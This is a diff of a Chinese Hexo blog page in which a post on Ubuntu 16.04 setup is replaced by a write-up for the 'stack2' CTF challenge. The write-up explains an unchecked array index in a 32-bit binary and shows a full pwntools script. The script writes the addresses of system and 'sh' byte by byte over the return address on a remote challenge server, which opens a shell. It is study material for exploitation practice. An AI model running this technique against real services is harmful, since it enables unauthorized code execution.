@@ -3,23 +3,30 @@
 <head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
-  <title>ubuntu16.04配置 | wolcome</title>
+  <title>stack2题解 | wolcome</title>
 
   <!-- keywords -->
   
 
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程 大家在使用虚拟机时尤其是在安装一些没用过的东西时最好可以 #拍快照 #或用挂起代替关机可以在出现问题的时候少浪费一些时间来处理问题 ubuntu下载https://blog.csdn.net/kwame211/article/details/83902851 1.安装">
+  <meta name="description" content="1.file命令查看为32位 2.checksec命令查看保护机制 由保护机制我想到的做本题的方法（1）绕过canary保护（2）rop链控制执行流 3.做题首先运行一下，查看程序的运行过程  因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。  查看字符串列表发现了熟悉的system函数与、bin/bash可">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ubuntu16.04配置">
-<meta property="og:url" content="http://yoursite.com/2019/10/11/ubuntu16-04配置/index.html">
+<meta property="og:title" content="stack2题解">
+<meta property="og:url" content="http://yoursite.com/2019/10/11/stack2题解/index.html">
 <meta property="og:site_name" content="wolcome">
-<meta property="og:description" content="由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程 大家在使用虚拟机时尤其是在安装一些没用过的东西时最好可以 #拍快照 #或用挂起代替关机可以在出现问题的时候少浪费一些时间来处理问题 ubuntu下载https://blog.csdn.net/kwame211/article/details/83902851 1.安装">
+<meta property="og:description" content="1.file命令查看为32位 2.checksec命令查看保护机制 由保护机制我想到的做本题的方法（1）绕过canary保护（2）rop链控制执行流 3.做题首先运行一下，查看程序的运行过程  因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。  查看字符串列表发现了熟悉的system函数与、bin/bash可">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-10-11T13:26:34.635Z">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/5.png">
+<meta property="og:image" content="http://yoursite.com/2019/10/11/stack2题解/6.png">
+<meta property="og:updated_time" content="2019-10-14T12:55:49.723Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ubuntu16.04配置">
-<meta name="twitter:description" content="由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程 大家在使用虚拟机时尤其是在安装一些没用过的东西时最好可以 #拍快照 #或用挂起代替关机可以在出现问题的时候少浪费一些时间来处理问题 ubuntu下载https://blog.csdn.net/kwame211/article/details/83902851 1.安装">
+<meta name="twitter:title" content="stack2题解">
+<meta name="twitter:description" content="1.file命令查看为32位 2.checksec命令查看保护机制 由保护机制我想到的做本题的方法（1）绕过canary保护（2）rop链控制执行流 3.做题首先运行一下，查看程序的运行过程  因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。  查看字符串列表发现了熟悉的system函数与、bin/bash可">
+<meta name="twitter:image" content="http://yoursite.com/2019/10/11/stack2题解/2.png">
   
     <link rel="alternative" href="/atom.xml" title="wolcome" type="application/atom+xml">
   
@@ -165,11 +172,11 @@
 		</header>				
 	</div>
 </nav>
-      <div class="body-wrap"><article id="post-ubuntu16-04配置" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-stack2题解" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/10/11/ubuntu16-04配置/" class="article-date">
-  	<time datetime="2019-10-11T13:11:22.000Z" itemprop="datePublished">2019-10-11</time>
+      <a href="/2019/10/11/stack2题解/" class="article-date">
+  	<time datetime="2019-10-11T14:06:49.000Z" itemprop="datePublished">2019-10-11</time>
 </a>
     </div>
   
@@ -182,7 +189,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      ubuntu16.04配置
+      stack2题解
       
     </h1>
   
@@ -200,41 +207,68 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>由于在使用虚拟机过程中有时会出现莫名的错误，我就因为网络等问题重新安装了虚拟机及镜像，顺便整理了一下ubuntu基本配置的安装过程</p>
-<p>大家在使用虚拟机时尤其是在安装一些没用过的东西时<br>最好可以</p>
-<p>#拍快照</p>
-<p>#或用挂起代替关机<br>可以在出现问题的时候少浪费一些时间来处理问题</p>
-<p>ubuntu下载<br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p>1.安装镜像后，安装VMtools<br>安装VMware Tools显示灰色正确解决办法<br><a href="https://blog.csdn.net/bluebird2/article/details/94162855" target="_blank" rel="noopener">https://blog.csdn.net/bluebird2/article/details/94162855</a><br>作用：<br><a href="https://blog.csdn.net/u012654205/article/details/42454527" target="_blank" rel="noopener">https://blog.csdn.net/u012654205/article/details/42454527</a><br>安装:<br><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a><br>安装时会出现很多提示 输入yes/no  都选 yes，</p>
-<p>如果提示 的是 路径， 则直接回车就好。</p>
-<p>直到安装完成，路径还在 vmware-tools-distrib 下</p>
-<p>2.更换软件源<br>源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，<br>相当于软件的下载服务器和更新服务器，<br>只不过不是某款软件的，而是该系统所有软件的下载服务器</p>
-<pre><code>    推荐：    https://blog.csdn.net/meteor_s/article/details/81301252
-https://blog.csdn.net/baidu_36602427/article/details/86551862  //源比较多
-https://www.cnblogs.com/flyinggod/p/7979108.html
-不推荐：https://blog.csdn.net/xkwy100/article/details/80301156
+        <p>1.file命令查看为32位</p>
+<p>2.checksec命令查看保护机制<br><img src="/2019/10/11/stack2题解/2.png" alt></p>
+<p>由保护机制我想到的做本题的方法<br>（1）绕过canary保护<br>（2）rop链控制执行流</p>
+<p>3.做题首先运行一下，查看程序的运行过程</p>
+<p><img src="/2019/10/11/stack2题解/1.png" alt></p>
+<p>因为做题的关键就在输入输出，本题的输入的作用显而易见，5个选项输入。因此我们可以查看伪c代码并多多观察输入的位置，查看是否有漏洞可以利用。</p>
+<p><img src="/2019/10/11/stack2题解/3.png" alt></p>
+<p>查看字符串列表发现了熟悉的system函数与、bin/bash<br>可以考虑使用覆盖返回地址，但本题开了保护，不能直接栈溢出，所以接着看伪代码。</p>
+<p><img src="/2019/10/11/stack2题解/4.png" alt></p>
+<p>在这里可以看到，没有限制v5的值，也就是我们可以通过这个更改距离v13任意位置的值设为v7，即通过两次输入更改值，那我们是否可以直接找到返回地址的位置并且改为system 的地址呢？<br>很明显是可以的。那么偏移是多少呢？</p>
+<p><img src="/2019/10/11/stack2题解/5.png" alt></p>
+<p>v13距离栈底0x70<br>所以距离是不是就是0x70+0x4呢？</p>
+<p>这里查询到返回地址和输入的地址。就可以利用差值得出结果0x84<br>但是不知道为什么0x74却不行</p>
+<p>这一题在覆盖返回地址时因为更改的数组的单个字节。是所以要用到多次写入。</p>
+<p>本题需要知道小端模式，现代计算机通常使用的一种内存排列格式</p>
+<p><img src="/2019/10/11/stack2题解/6.png" alt><br>下面是脚本</p>
+<pre><code>#!/usr/bin/python
+#coding:utf-8
 
-解决问题E: Could not get lock /var/lib/apt/lists/lock
-https://www.cnblogs.com/qq952693358/p/6537846.html</code></pre><p>3.安装pip</p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<pre><code>安装：  sudo apt install python-pip
+from pwn import*
 
-遇到问题，    
-        Unable to locate package python-pip
-解决方法： 更新软件源
-        sudo apt-get update
 
-网址    https://www.jianshu.com/p/568aab038d4c
-    https://blog.csdn.net/qq_35759574/article/details/82842637</code></pre><p>4.更改pip源<br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的。</p>
-<pre><code>sudo mkdir ~/.pip/
-cd ./.pip/
-touch pip.conf
-sudo gedit pip.conf 
 
-网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
-        https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
-<pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
 
+
+
+system_addr=0x080485AF
+leave_offset=0x84
+
+
+def write_addr(addr,va):
+    io.sendline(&quot;3&quot;)
+    io.recvuntil(&quot;which number to change:\n&quot;)
+    io.sendline(str(addr))
+    io.recvuntil(&quot;new number:\n&quot;)
+    io.sendline(str(va))
+    io.recvuntil(&quot;5. exit\n&quot;)
+
+io=remote(&apos;111.198.29.45&apos;,&apos;31725&apos;)
+io.recvuntil(&quot;How many numbers you have:\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;Give me your numbers\n&quot;)
+io.sendline(&quot;1&quot;)
+io.recvuntil(&quot;5. exit\n&quot;)
+
+
+# write  system_addr  0x08048450
+
+write_addr(leave_offset,0X50)
+write_addr(leave_offset+1,0X84)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+# sh_addr  0x08048987
+leave_offset+=8
+print leave_offset
+write_addr(leave_offset,0x87)
+write_addr(leave_offset+1,0X89)
+write_addr(leave_offset+2,0X04)
+write_addr(leave_offset+3,0X08)
+
+io.sendline(&quot;5&quot;)
+io.interactive()    </code></pre>
       
     </div>
     
@@ -243,18 +277,9 @@ sudo gedit pip.conf
     
 <nav id="article-nav">
   
-    <a href="/2019/10/11/stack2题解/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">&lt;</strong>
-      <div class="article-nav-title">
-        
-          stack2题解
-        
-      </div>
-    </a>
   
-  
-    <a href="/2019/10/09/shell/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">shell</div>
+    <a href="/2019/10/11/ubuntu16-04配置/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ubuntu16.04配置</div>
       <strong class="article-nav-caption">&gt;</strong>
     </a>
   
